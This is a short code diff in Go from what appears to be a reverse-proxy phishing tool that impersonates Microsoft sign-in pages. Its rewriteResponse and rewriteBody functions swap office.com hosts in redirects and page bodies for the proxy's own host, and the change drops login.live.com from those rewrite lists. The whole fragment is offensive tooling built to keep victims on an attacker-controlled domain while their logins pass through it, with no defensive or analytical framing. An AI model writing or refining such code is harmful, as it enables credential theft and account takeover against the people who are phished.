@@ -188,7 +188,6 @@ func rewriteResponse(resp *http.Response, upstreamHost, ourHost string, pl *Phis
 			loc = strings.ReplaceAll(loc, upstreamHost, ourHost)
 			loc = strings.ReplaceAll(loc, "www.office.com", ourHost)
 			loc = strings.ReplaceAll(loc, "office.com", ourHost)
-			loc = strings.ReplaceAll(loc, "login.live.com", ourHost)
 			resp.Header.Set("Location", loc)
 		}
 	}
@@ -319,7 +318,7 @@ func rewriteBody(resp *http.Response, upstreamHost, ourHost string) {
 	resp.Body.Close()
 
 	rewritten := strings.ReplaceAll(string(body), upstreamHost, ourHost)
-	for _, alt := range []string{"www.office.com", "office.com", "login.live.com"} {
+	for _, alt := range []string{"www.office.com", "office.com"} {
 		if alt != upstreamHost {
 			rewritten = strings.ReplaceAll(rewritten, alt, ourHost)
 		}
